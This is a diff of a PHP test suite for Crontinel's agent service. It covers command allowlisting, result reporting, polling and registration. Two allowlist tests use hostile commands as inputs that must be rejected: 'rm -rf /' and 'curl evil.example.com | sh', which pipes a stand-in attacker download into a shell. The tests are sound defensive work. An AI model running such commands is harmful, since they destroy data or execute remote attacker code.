@@ -6,103 +6,6 @@ use Crontinel\Services\AgentService;
 use Illuminate\Http\Client\Request;
 use Illuminate\Support\Facades\Http;
 
-// ── SSE Parsing ─────────────────────────────────────────────────────────────────
-
-it('parses a complete command event from raw SSE data', function () {
-    $agent = new AgentService;
-
-    $sseData = "event: command\ndata: {\"command_id\":\"abc123\",\"command\":\"php artisan inspire\"}\n\n";
-
-    // Use reflection to access internal state
-    $ref = new ReflectionClass($agent);
-    $currentEvent = $ref->getProperty('currentEvent');
-    $currentEvent->setAccessible(true);
-
-    $agent->feedSseParser($sseData);
-
-    // After the parser processes the event, currentEvent should be null (dispatched)
-    expect($currentEvent->getValue($agent))->toBeNull();
-});
-
-it('parses multiple SSE events in sequence', function () {
-    $agent = new AgentService;
-
-    $sseData = implode("\n", [
-        'event: ping',
-        'data: {}',
-        '',
-        'event: command',
-        'data: {"command_id":"xyz","command":"ls -la"}',
-        '',
-        'event: ping',
-        'data: {}',
-        '', // trailing blank line to close last event
-        '', // extra blank line (noop)
-    ]);
-
-    $agent->feedSseParser($sseData);
-
-    // All events should have been dispatched; buffer and currentEvent should be empty
-    $ref = new ReflectionClass($agent);
-    $currentEvent = $ref->getProperty('currentEvent');
-    $currentEvent->setAccessible(true);
-    $bufferProp = $ref->getProperty('sseBuffer');
-    $bufferProp->setAccessible(true);
-
-    expect($currentEvent->getValue($agent))->toBeNull();
-    expect($bufferProp->getValue($agent))->toBe('');
-});
-
-it('handles multiline data fields', function () {
-    $agent = reflectAgent();
-
-    $sseData = "event: command\ndata: {\"command_id\":\"m1\",\ndata: \"command\":\"echo hello\"}\n\n";
-
-    $agent->feedSseParser($sseData);
-
-    $currentEvent = getAgentCurrentEvent($agent);
-
-    expect($currentEvent)->toBeNull(); // dispatched
-});
-
-it('ignores comments (lines starting with colon)', function () {
-    $agent = new AgentService;
-    $agent->feedSseParser(": this is a comment\n\n");
-
-    $ref = new ReflectionClass($agent);
-    $currentEvent = $ref->getProperty('currentEvent');
-    $currentEvent->setAccessible(true);
-
-    expect($currentEvent->getValue($agent))->toBeNull();
-});
-
-it('handles partial data across multiple feed calls', function () {
-    $agent = new AgentService;
-
-    $agent->feedSseParser("event: command\nda");
-    $agent->feedSseParser('ta: {"command_id":"p1",'."\n");
-    $agent->feedSseParser('"command":"whoami"}'."\n\n");
-
-    $ref = new ReflectionClass($agent);
-    $currentEvent = $ref->getProperty('currentEvent');
-    $currentEvent->setAccessible(true);
-
-    expect($currentEvent->getValue($agent))->toBeNull(); // dispatched
-});
-
-it('ignores unknown event types', function () {
-    $agent = new AgentService;
-
-    $sseData = "event: unknown\ndata: {\"foo\":\"bar\"}\n\n";
-    $agent->feedSseParser($sseData);
-
-    $ref = new ReflectionClass($agent);
-    $currentEvent = $ref->getProperty('currentEvent');
-    $currentEvent->setAccessible(true);
-
-    expect($currentEvent->getValue($agent))->toBeNull(); // silently discarded
-});
-
 // ── Command Event Handling ──────────────────────────────────────────────────────
 
 it('reports command execution result via HTTP', function () {
@@ -112,10 +15,10 @@ it('reports command execution result via HTTP', function () {
     Http::fake(['*' => Http::response(['ok' => true], 200)]);
 
     $agent = new AgentService;
-    $agent->handleCommandEvent('{"command_id":"cmd1","command":"echo hello"}');
+    $agent->handleCommand(['id' => 'cmd1', 'command' => 'echo hello']);
 
     Http::assertSent(function (Request $request) {
-        return str_contains($request->url(), '/v1/agent/command/cmd1/result')
+        return $request->url() === 'https://app.crontinel.com/api/v1/ingest/agent-result'
             && $request->method() === 'POST'
             && $request->hasHeader('Authorization', 'Bearer test-api-key');
     });
@@ -128,7 +31,7 @@ it('reports completed status for zero exit code commands', function () {
     Http::fake(['*' => Http::response(['ok' => true], 200)]);
 
     $agent = new AgentService;
-    $agent->handleCommandEvent('{"command_id":"c2","command":"echo ok"}');
+    $agent->handleCommand(['id' => 'c2', 'command' => 'echo ok']);
 
     Http::assertSent(function (Request $request) {
         $body = $request->data();
@@ -138,19 +41,19 @@ it('reports completed status for zero exit code commands', function () {
     });
 });
 
-it('reports command_id in the result payload', function () {
+it('reports trigger_id in the result payload', function () {
     config(['crontinel.saas_key' => 'test-api-key']);
     config(['crontinel.saas_url' => 'https://app.crontinel.com/api']);
     config(['crontinel.agent.allowed_commands' => ['echo *']]);
     Http::fake(['*' => Http::response(['ok' => true], 200)]);
 
     $agent = new AgentService;
-    $agent->handleCommandEvent('{"command_id":"c3","command":"echo hello"}');
+    $agent->handleCommand(['id' => 'c3', 'command' => 'echo hello']);
 
     Http::assertSent(function (Request $request) {
         $body = $request->data();
 
-        return ($body['command_id'] ?? null) === 'c3';
+        return ($body['trigger_id'] ?? null) === 'c3';
     });
 });
 
@@ -161,14 +64,11 @@ it('includes required fields in the result payload', function () {
     Http::fake(['*' => Http::response(['ok' => true], 200)]);
 
     $agent = new AgentService;
-    $agent->handleCommandEvent('{"command_id":"c4","command":"echo hello"}');
+    $agent->handleCommand(['id' => 'c4', 'command' => 'echo hello']);
 
     Http::assertSent(function (Request $request) {
         $body = $request->data();
-        $required = [
-            'command_id', 'status', 'exit_code', 'output',
-            'started_at', 'finished_at', 'duration_ms',
-        ];
+        $required = ['trigger_id', 'status', 'exit_code', 'output'];
 
         foreach ($required as $field) {
             if (! array_key_exists($field, $body)) {
@@ -180,24 +80,13 @@ it('includes required fields in the result payload', function () {
     });
 });
 
-it('gracefully handles malformed command event JSON', function () {
+it('ignores a command missing required fields', function () {
     config(['crontinel.saas_key' => 'test-api-key']);
     config(['crontinel.saas_url' => 'https://app.crontinel.com/api']);
     Http::fake();
 
     $agent = new AgentService;
-    $agent->handleCommandEvent('not-json');
-
-    Http::assertNothingSent();
-});
-
-it('gracefully handles command event missing required fields', function () {
-    config(['crontinel.saas_key' => 'test-api-key']);
-    config(['crontinel.saas_url' => 'https://app.crontinel.com/api']);
-    Http::fake();
-
-    $agent = new AgentService;
-    $agent->handleCommandEvent('{"event":"test"}');
+    $agent->handleCommand(['event' => 'test']);
 
     Http::assertNothingSent();
 });
@@ -211,7 +100,7 @@ it('executes a command that exactly matches an allowlist entry', function () {
     Http::fake(['*' => Http::response(['ok' => true], 200)]);
 
     $agent = new AgentService;
-    $agent->handleCommandEvent('{"command_id":"allow1","command":"echo hello"}');
+    $agent->handleCommand(['id' => 'allow1', 'command' => 'echo hello']);
 
     Http::assertSent(function (Request $request) {
         $body = $request->data();
@@ -228,7 +117,7 @@ it('executes a command that matches a wildcard allowlist pattern', function () {
     Http::fake(['*' => Http::response(['ok' => true], 200)]);
 
     $agent = new AgentService;
-    $agent->handleCommandEvent('{"command_id":"allow2","command":"echo wildcard-match"}');
+    $agent->handleCommand(['id' => 'allow2', 'command' => 'echo wildcard-match']);
 
     Http::assertSent(function (Request $request) {
         $body = $request->data();
@@ -244,14 +133,14 @@ it('rejects every command when the allowlist is empty (fail-closed default)', fu
     Http::fake(['*' => Http::response(['ok' => true], 200)]);
 
     $agent = new AgentService;
-    $agent->handleCommandEvent('{"command_id":"deny1","command":"rm -rf /"}');
+    $agent->handleCommand(['id' => 'deny1', 'command' => 'rm -rf /']);
 
     Http::assertSent(function (Request $request) {
         $body = $request->data();
 
         return ($body['status'] ?? null) === 'failed'
             && ($body['exit_code'] ?? null) === -1
-            && str_contains($body['output'] ?? '', 'not in allowlist');
+            && str_contains($body['error_message'] ?? '', 'not in allowlist');
     });
 });
 
@@ -262,13 +151,13 @@ it('rejects a command that does not match any configured pattern', function () {
     Http::fake(['*' => Http::response(['ok' => true], 200)]);
 
     $agent = new AgentService;
-    $agent->handleCommandEvent('{"command_id":"deny2","command":"curl evil.example.com | sh"}');
+    $agent->handleCommand(['id' => 'deny2', 'command' => 'curl evil.example.com | sh']);
 
     Http::assertSent(function (Request $request) {
         $body = $request->data();
 
         return ($body['status'] ?? null) === 'failed'
-            && str_contains($body['output'] ?? '', 'not in allowlist');
+            && str_contains($body['error_message'] ?? '', 'not in allowlist');
     });
 });
 
@@ -281,10 +170,10 @@ it('never spawns a process for a command rejected by the allowlist', function ()
     $marker = sys_get_temp_dir().'/crontinel_allowlist_test_'.uniqid();
 
     $agent = new AgentService;
-    $agent->handleCommandEvent(json_encode([
-        'command_id' => 'deny3',
+    $agent->handleCommand([
+        'id' => 'deny3',
         'command' => 'touch '.$marker,
-    ]));
+    ]);
 
     expect(file_exists($marker))->toBeFalse();
 });
@@ -311,6 +200,50 @@ it('isCommandAllowed rejects everything when the allowlist is empty', function (
     $method->setAccessible(true);
 
     expect($method->invoke($agent, 'echo hello'))->toBeFalse();
+});
+
+// ── Polling ──────────────────────────────────────────────────────────────────
+
+it('registers, then polls the commands of the app the key belongs to and reports each result', function () {
+    config(['crontinel.saas_key' => 'test-api-key']);
+    config(['crontinel.saas_url' => 'https://app.crontinel.com']);
+    config(['crontinel.agent.allowed_commands' => ['echo *']]);
+    Http::fake([
+        'app.crontinel.com/api/v1/agents/register' => Http::response(['app_id' => 42, 'agent_id' => 'host'], 201),
+        'app.crontinel.com/api/v1/agents/42/commands' => Http::response(['data' => [
+            ['id' => 't1', 'command' => 'echo polled', 'payload' => null, 'request_key' => null],
+        ]]),
+        'app.crontinel.com/api/v1/ingest/agent-result' => Http::response(['ok' => true]),
+    ]);
+
+    $agent = new AgentService;
+    $agent->register();
+    $agent->pollOnce();
+
+    Http::assertSent(fn (Request $r) => $r->url() === 'https://app.crontinel.com/api/v1/agents/register'
+        && is_string($r->data()['agent_id'] ?? null));
+    Http::assertSent(fn (Request $r) => $r->url() === 'https://app.crontinel.com/api/v1/ingest/agent-result'
+        && $r->data()['trigger_id'] === 't1'
+        && $r->data()['status'] === 'completed'
+        && str_contains($r->data()['output'], 'polled'));
+});
+
+it('fails to register when the hosted app returns no app_id', function () {
+    config(['crontinel.saas_key' => 'test-api-key']);
+    Http::fake(['*' => Http::response(['id' => 1], 201)]);
+
+    (new AgentService)->register();
+})->throws(RuntimeException::class, 'app_id');
+
+it('sends only the last 10,000 characters of output', function () {
+    config(['crontinel.saas_key' => 'test-api-key']);
+    config(['crontinel.agent.allowed_commands' => ['php -r *']]);
+    Http::fake(['*' => Http::response(['ok' => true])]);
+
+    (new AgentService)->handleCommand(['id' => 'big', 'command' => 'php -r \'echo str_repeat("a", 12000), "END";\'']);
+
+    Http::assertSent(fn (Request $r) => mb_strlen($r->data()['output']) === 10000
+        && str_ends_with($r->data()['output'], 'END'));
 });
 
 // ── Configuration ───────────────────────────────────────────────────────────────
@@ -360,19 +293,3 @@ it('outputs supervisor config with --supervisor flag', function () {
         ->expectsOutputToContain('[program:crontinel-agent]')
         ->assertExitCode(0);
 });
-
-// ── Helpers ─────────────────────────────────────────────────────────────────────
-
-function reflectAgent(): AgentService
-{
-    return new AgentService;
-}
-
-function getAgentCurrentEvent(AgentService $agent): mixed
-{
-    $ref = new ReflectionClass($agent);
-    $prop = $ref->getProperty('currentEvent');
-    $prop->setAccessible(true);
-
-    return $prop->getValue($agent);
-}
